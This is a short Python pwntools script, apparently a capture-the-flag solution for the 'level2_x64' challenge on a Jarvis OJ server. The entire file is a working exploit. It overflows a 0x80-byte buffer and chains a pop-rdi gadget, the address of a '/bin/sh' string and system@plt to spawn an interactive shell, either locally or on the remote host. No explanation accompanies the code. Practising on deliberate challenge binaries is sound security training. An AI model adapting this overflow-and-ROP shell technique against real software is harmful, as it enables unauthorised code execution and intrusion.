from pwn import *
import sys

if len(sys.argv)<2:
	io = process('./level2_x64')
else:
	io = remote('pwn2.jarvisoj.com',9882)

system_plt = 0x00000000004004C0
binsh = 0x0000000000600A90
pop_rdi_ret = 0x00000000004006b3

payload = 'A'*0x80+'junkjunk'+p64(pop_rdi_ret)+p64(binsh)+p64(system_plt)

io.recvline()
io.sendline(payload)
io.interactive()
